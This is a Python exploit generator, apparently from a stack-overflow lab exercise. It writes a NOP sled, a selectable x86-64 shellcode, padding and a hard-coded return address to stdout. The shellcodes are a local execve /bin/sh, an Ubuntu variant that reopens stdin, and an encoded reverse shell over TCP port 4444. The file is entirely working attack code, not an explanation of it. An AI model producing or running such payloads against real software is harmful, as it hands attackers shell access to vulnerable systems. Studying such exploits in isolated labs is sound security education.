#!/usr/bin/env python
#from struct import pack
import sys
import argparse
import sys

# messages on stderr not to collide with output
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

payload_len = 408
nop = b"\x90"*200
#rip := 0x00007fffffffdba0
rip = b"\xa0\xdb\xff\xff\xff\x7f\x00\x00"
shellcode = b""

# usage <cmd> [-o <num>]
# num = 0 (default, my shellcpde)
# num = 1 (reopen stdin, needed for ubuntu)
# num = 2 (original shellcode, remote shell)
parser = argparse.ArgumentParser()
parser.add_argument('-o', type=str,
    help='shell code num (0 shell / default, 1 Ubuntu, 2 legacy remote shell)')
args = parser.parse_args()

# output in ./<input name>.shellcode if output path undefined
if args.o == '2':
    eprint ("you selected shellcode 2: original remote shell")
    eprint ("ADVISE: SNAPSHOT BEFORE AND ROLLBACK AFTER USE!!!")
    # original payload = reverse shell over tcp port 4444
    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
    shellcode += b"\xef\xff\xff\xff\x48\xbb\x4b\x39\x49\xc0\x26\xc4\xb7"
    shellcode += b"\x43\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    shellcode += b"\x21\x10\x11\x59\x4c\xc6\xe8\x29\x4a\x67\x46\xc5\x6e"
    shellcode += b"\x53\xff\xfa\x49\x39\x58\x9c\x59\xc4\xb7\x42\x1a\x71"
    shellcode += b"\xc0\x26\x4c\xd4\xed\x29\x61\x61\x46\xc5\x4c\xc7\xe9"
    shellcode += b"\x0b\xb4\xf7\x23\xe1\x7e\xcb\xb2\x36\xbd\x53\x72\x98"
    shellcode += b"\xbf\x8c\x0c\x6c\x29\x50\x27\xef\x55\xac\xb7\x10\x03"
    shellcode += b"\xb0\xae\x92\x71\x8c\x3e\xa5\x44\x3c\x49\xc0\x26\xc4"
    shellcode += b"\xb7\x43"
elif args.o == '1':
    eprint ("you selected shellcode 1: /bin/sh for most linux")
    eprint ("WARNING: DOES NOT WORK ON UBUNTU")
    # my shellcode = execve(/bin/shell)
    shellcode += b"\x48\x31\xc0\x50\x49\xba\x2f\x2f\x62\x69\x6e\x2f\x73"
    shellcode += b"\x68\x41\x52\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0"
    shellcode += b"\x3b\x0f\x05"
else:
    eprint ("you selected shellcode 0: /bin/sh for Ubuntu")
    #######################
    # these shell code are not working
    # - for some reason the fork from execve in gdb terminates after launch
    # - it seems that the shell must reopen stdin to persist according to:
    #   https://stackoverflow.com/questions/2859127/shellcode-for-a-simple-stack-overflow-exploited-program-with-shell-terminates-d
    # - thus, the next one starts by reopening stdin
    # - taken at https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html
    #######################
    shellcode += b"\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05"
    shellcode += b"\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54"
    shellcode += b"\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48"
    shellcode += b"\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50"
    shellcode += b"\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"

buf_len = len(shellcode)
nop_len = len(nop)
padding = b"A"*(payload_len-nop_len-buf_len)

#payload = nop + shellcode + padding + pack("<Q", rip)
payload = nop + shellcode + padding + rip

#print(payload)
sys.stdout.buffer.write(payload)

